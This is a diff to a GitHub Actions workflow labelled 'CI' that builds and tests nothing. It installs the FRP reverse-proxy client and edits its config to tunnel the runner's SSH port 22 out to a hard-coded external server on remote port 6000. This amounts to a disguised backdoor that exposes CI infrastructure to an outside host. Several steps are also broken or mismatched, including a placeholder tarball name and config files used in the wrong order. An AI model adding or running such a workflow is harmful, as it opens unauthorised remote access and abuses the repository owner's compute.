@@ -1,10 +1,46 @@
+name: CI
 
-name: Cl
-
-on: [push, workflow_dispatch]
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
 
 jobs:
   build:
+    runs-on: ubuntu-latest
 
-    runs-on: ubuntu-20.04
+    steps:
+    - uses: actions/checkout@v2
 
+    # Install FRP
+    - name: Install FRP
+      run: |
+        wget https://github.com/fatedier/frp/releases/download/v0.37.0/frp_0.37.0_linux_amd64.tar.gz
+        tar -xzf frp_0.37.0_linux_amd64.tar.gz
+        chmod +x frp_0.37.0_linux_amd64/frpc
+        mv frp_0.37.0_linux_amd64/frpc /usr/local/bin/frpc
+
+    # Port Forwarding with FRP
+    - name: Start FRP Proxy
+      run: |
+        frpc -c frpc.ini
+
+    # Extract tar file
+    - name: Extract tar file
+      run: |
+        tar -xzf your_file.tar.gz
+
+    # Edit frpc.toml
+    - name: Edit frpc.toml
+      run: |
+        sed -i 's/serverAddr = ""/serverAddr = "213.130.144.44"/g' frpc.toml
+        sed -i 's/serverPort = 0/serverPort = 7000/g' frpc.toml
+        sed -i '/\[proxies\]/a [[proxies]]\nname = "test-tcp"\ntype = "tcp"\nlocalIP = "127.0.0.1"\nlocalPort = 22\nremotePort = 6000' frpc.toml
+
+    # Run frpc
+    - name: Run frpc
+      run: |
+        ./frpc -c frpc.toml
